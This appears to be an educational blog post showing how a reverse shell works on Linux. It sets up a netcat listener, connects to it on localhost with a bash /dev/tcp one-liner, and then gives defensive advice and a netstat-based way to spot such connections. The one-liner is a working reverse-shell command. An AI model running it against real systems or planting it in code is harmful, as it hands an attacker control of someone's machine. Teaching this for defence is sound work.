---
title: "What does a reverse shell actually look like?"
description: "Using basic Linux Bash commands to demonstrate a simple reverse shell."
tags:
  - networking
  - linux
  - bash
  - nc
  - security


---

A reverse shell is a type of shell where the target machine (under attack) communicates back to an attacker's machine, and importantly, gives the attacker control over the target machine. 

The attacker's machine will be listening on a port. A malicious script runs on the target machine, which connects back to the attacker's machine. The attacker's machine receives the connection. The attacker is then able to execute commands on the target machine.  

I'll create a simple example to demonstrate one to follow along with, it's just a few basic Linux Bash commands on the same machine. The simplicity of setting up a reverse shell is the reason why you should always be careful about what you run on your machine.

## Set up the listener

In one terminal window, setup a listener. Pretend that this is the attacker's machine.     

```bash
nc -lnvp 1337
```

Alternatively, you can run this in docker which does the same thing, it's your choice. 

```bash
docker run -it -p 1337:1337 --rm busybox:stable nc -lnvp 1337
```

Either way, the output should simply say "Listening on 0.0.0.0 1337". 


## Connect to the listener

Now in another terminal window, run this command to 'connect' to the listener. Pretend that this is the machine being compromised.  

```bash
/bin/bash --rcfile <(echo "PS1='omghacker: '") -i >& /dev/tcp/127.0.0.1/1337 0>&1
```

The `/bin/bash` starts a new shell.    
The `-i` makes it interactive.     
The `>& /dev/tcp/...` redirects the input and output to the listener by making use of the [`/dev/tcp` feature in Linux Bash](2024-07-28-networking-cheat-sheet.md#reach-a-port-on-a-server).    
The `0>&1` redirects both standard input and output to the listener.      
The `--rcfile` bit is just something I've added for the next step, but isn't necessary.  

## What happens?

Nothing will happen in the second terminal window. But, go back to the first terminal window where the listener is running, and you should see a new prompt. It might look something like this.  

```
$ nc -lnvp 1337
Listening on 0.0.0.0 1337
Connection received on 127.0.0.1 39738
omghacker:
```

The `omghacker:` is the prompt from the "compromised machine". 

You can now try running commands against it. Try `ls`, `pwd`, `whoami`, etc.

![Reverse shell](/assets/images/simple-reverse-shell-in-linux-bash/001.png)



When you're done, just `exit` to close the connection.


## Why is this dangerous?

This demonstrates just how easy it is to set up a reverse shell; the danger is its simplicity. It's not just limited to Bash, it can be done in [several languages and environments](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/). 

The `whoami` command would have shown that it's the user running on the compromised machine, which means their permissions are the attacker's permissions. 

It's also one of the (many) reasons that `curl | bash` type installations, often seen when installing software, are frowned upon. Sadly, they are still widely used out of laziness, convenience, or simply ignorance, and it is pretty sad to see well established projects promoting this security risk. 

The best way to protect yourself from a reverse shell attack is to be careful about what you run on your machine. If you're running a script from the internet, make sure you understand what it does first, don't just blindly run it. 

For developers, it's important to be avoid trying to make OS calls from code, especially when passing user input directly to the command. Those situations should be avoided as much as possible. Bash is rich and powerful in the creativity it proffers, and so sanitisation is not really going to help that much.

For application deployments, this is one of the (many) reasons why containers are useful; they provide a level of isolation, and therefore a reduced blast radius if something goes wrong.  

Just for reference, the following command can show you all the established connections on your machine, with the process ID and command. 

```bash
netstat -pan | grep -i ESTABLISHED
```

Here is what the reverse shell example would look like. An established connection from bash should prompt you to investigate further.

```
tcp        0      0 127.0.0.1:49364         127.0.0.1:1337          ESTABLISHED 24449/bash 
```

Note: it's not a perfect way of detecting reverse shells though, there are ways of hiding the connection, and the connection isn't always active. Other tools like [Fenrir](https://github.com/Neo23x0/Fenrir) might help as well. 
